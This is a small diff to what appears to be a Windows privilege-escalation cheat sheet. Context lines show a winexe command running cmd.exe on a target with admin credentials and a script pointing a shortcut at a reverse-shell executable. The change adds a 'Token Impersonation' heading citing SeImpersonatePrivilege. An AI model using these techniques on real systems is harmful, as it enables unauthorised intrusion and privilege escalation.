@@ -77,4 +77,6 @@ winexe -U 'admin%password' //[target host] cmd.exe
         oLink.TargetPath = "C:\PrivEsc\reverse.exe"
         oLink.Save
 
-## 
+## Token Impersonation
+SeImpersonatePrivilege https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
+
